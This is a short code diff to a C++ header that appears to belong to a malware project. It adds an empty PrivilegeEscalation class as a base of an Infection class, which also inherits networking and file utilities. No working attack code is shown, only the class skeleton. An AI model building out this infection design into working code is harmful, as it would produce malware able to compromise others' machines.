@@ -38,7 +38,7 @@ struct Adapters {
 };
 
 class PrivilegeEscalation{
-	
+
 };
 
 class Networking {
@@ -47,7 +47,7 @@ public:
 	void enumerateAdapters();
 };
 
-class Infection : public Networking, public FileUtilities {
+class Infection : public Networking, public FileUtilities, public PrivilegeEscalation {
 private:
 	//Variables
 	char* user;
